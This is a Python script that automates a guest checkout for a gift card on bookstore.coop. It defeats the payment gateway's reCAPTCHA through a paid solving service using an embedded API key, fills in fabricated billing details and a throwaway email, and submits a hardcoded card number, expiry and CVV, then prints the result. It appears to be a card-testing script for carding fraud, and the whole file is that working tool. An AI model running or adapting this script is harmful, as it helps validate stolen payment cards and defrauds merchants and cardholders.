import requests
import capsolver
import asyncio

capsolver.api_key = "CAP-02DB3E5188C3DDD58C43DCF9B69FE560"

async def chpy():
    session = requests.session()
    g_response = (await asyncio.to_thread(lambda: capsolver.solve({
    "type": "ReCaptchaV2EnterpriseTaskProxyLess",
    "websiteKey": '6LegeOMkAAAAAH2xnPPldKJX-HXlEtGkhkDb-FZi',
    "websiteURL": 'https://checkout.e-xact.com/payment/cc_payment',
    })))['gRecaptchaResponse']

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://bookstore.coop',
        'Pragma': 'no-cache',
        'Referer': 'https://bookstore.coop/Catalogue/product-catalogue/gift-cards',
    }

    data = {
        'item': '680087007576',
        'qty': '1',
        'view': 'Json',
        'template': 'Json', 
    }

    req1 = session.post('https://bookstore.coop/Basket/ajaxAddItem',headers=headers, data=data)

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://bookstore.coop/Basket',
    }

    req2 = session.get('https://bookstore.coop/Checkout', headers=headers)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'PHPSESSID=052e6f95d6da020da43b80a540ac64c9',
        'Origin': 'https://bookstore.coop',
        'Pragma': 'no-cache',
        'Referer': 'https://bookstore.coop/Checkout',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'guest_email': 'scarlatmario2344@tiktok.tf',
        'guest_checkout': 'Checkout as Guest',
    }

    req3 = session.post('https://bookstore.coop/Auth/guest', headers=headers, data=data)
    response = session.get('https://bookstore.coop/Checkout/billing',headers=headers)

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'PHPSESSID=052e6f95d6da020da43b80a540ac64c9',
        'Origin': 'https://bookstore.coop',
        'Pragma': 'no-cache',
        'Referer': 'https://bookstore.coop/Checkout/billing',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'order_type': 'p',
        'email': 'scarlatmario2344@tiktok.tf',
        'email_confirm': 'scarlatmario2344@tiktok.tf',
        'first_name': 'Sebastian',
        'last_name': 'Gutierrez',
        'company': 'Hunter',
        'address': '103-105 Central Ave',
        'address2': '',
        'country': 'UNITED STATES',
        'province': 'NJ',
        'province-other': '',
        'city': 'Orange',
        'postal_code': '07050-3824',
        'daytime_phone1': '505',
        'daytime_phone2': '994',
        'daytime_phone3': '7000',
        'ext': '',
        'fax1': '',
        'fax2': '',
        'fax3': '',
        'extra_field': '',
        'submit': 'Save and Continue',
    }



    req4 = session.post('https://bookstore.coop/Checkout/billing', headers=headers, data=data)

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'PHPSESSID=052e6f95d6da020da43b80a540ac64c9',
        'Origin': 'https://bookstore.coop',
        'Pragma': 'no-cache',
        'Referer': 'https://bookstore.coop/Checkout/shipping',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'payment_type': 'billing',
    }

    req5 = session.post('https://bookstore.coop/Checkout/shipping', headers=headers, data=data)

    params = {
        'template': 'json',
        'view': 'json',
    }

    data = {
        'ship_profile': '1',
    }

    req6 = session.post('https://bookstore.coop/OrderReview', params=params, headers=headers, data=data)

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'PHPSESSID=052e6f95d6da020da43b80a540ac64c9',
        'Origin': 'https://bookstore.coop',
        'Pragma': 'no-cache',
        'Referer': 'https://bookstore.coop/OrderReview',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'action': 'giftcard',
        'special_instructions': '',
    }

    req7 = session.post('https://bookstore.coop/OrderReview', headers=headers, data=data)

    data = {
        'buyback_register': 'on',
    }

    req8 = session.post('https://bookstore.coop/OrderReview/register', headers=headers, data=data)
    xlogin = req8.text.split('name="x_login" value="')[1].split('"')[0]
    xsequence = req8.text.split('name="x_fp_sequence" value="')[1].split('"')[0]
    xtimestamp = req8.text.split('name="x_fp_timestamp" value="')[1].split('"')[0]
    xhash = req8.text.split('name="x_fp_hash" value="')[1].split('"')[0]
    xamount = req8.text.split('name="x_amount" value="')[1].split('"')[0]

    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_steam_hco_id=48502da97b97befa1c751c7f4a25f4b4',
    'origin': 'https://checkout.e-xact.com',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://checkout.e-xact.com/collect_payment_data?ant=48502da97b97befa1c751c7f4a25f4b4&merchant=WSP-CO-OP-mEHw3wAa7A&order=5ad75ab2d1008088cc7e22fe2951e5b1f12edb0a23fd83242d93f0375a9bef32&purch=766223862&t=4',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    data = {
        'jmsg': '448588608',
        'exact_cardholder_name': 'cristofer p',
        'servdt5': '3',
        'merchant': xlogin,
        'x_card_num': '4517699017041929',
        'x_exp_date': '1127',
        'x_card_code': '777',
        'cvd_presence_ind': '1',
        'g-recaptcha-response': g_response,
        'commit': 'Pay With Your Credit Card',
    }

    req9 = session.post('https://checkout.e-xact.com/payment/cc_payment', headers=headers, data=data)
    print(req9.text)
asyncio.run(chpy())